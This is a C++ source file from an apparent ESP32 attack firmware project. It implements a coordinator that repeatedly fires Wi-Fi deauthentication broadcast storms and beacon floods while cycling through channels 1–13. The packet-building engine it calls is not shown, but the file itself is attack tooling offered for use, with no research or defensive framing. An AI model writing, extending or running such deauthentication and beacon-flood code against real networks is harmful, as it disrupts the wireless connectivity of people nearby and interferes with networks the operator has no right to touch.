/**
 * @file WiFiDeauthAttack.cpp
 * @brief Native 802.11 Deauthentication & Beacon Flood Attack Coordinator implementation
 * @author ESP32-RF-SWORD Core Team
 * @license MIT
 */

#include "attack/WiFiDeauthAttack.h"
#include "radio/WiFiEngine.h"
#include "core/SystemState.h"

#ifndef HOST_SIMULATION
#include <Arduino.h>
#endif

WiFiDeauthAttack& WiFiDeauthAttack::instance() {
    static WiFiDeauthAttack s_instance;
    return s_instance;
}

WiFiDeauthAttack::WiFiDeauthAttack() {
}

void WiFiDeauthAttack::init() {
    WiFiEngine::instance().init();
    currentChannel = 1;
}

void WiFiDeauthAttack::stepDeauthStorm() {
    WiFiEngine::instance().stepDeauthBroadcastStorm(currentChannel);
    currentChannel = (currentChannel % 13) + 1; // Cycle Wi-Fi channels 1-13
#ifndef HOST_SIMULATION
    delay(2);
#endif
}

void WiFiDeauthAttack::stepBeaconFlood() {
    WiFiEngine::instance().stepBeaconStorm(currentChannel);
    currentChannel = (currentChannel % 13) + 1;
#ifndef HOST_SIMULATION
    delay(5);
#endif
}
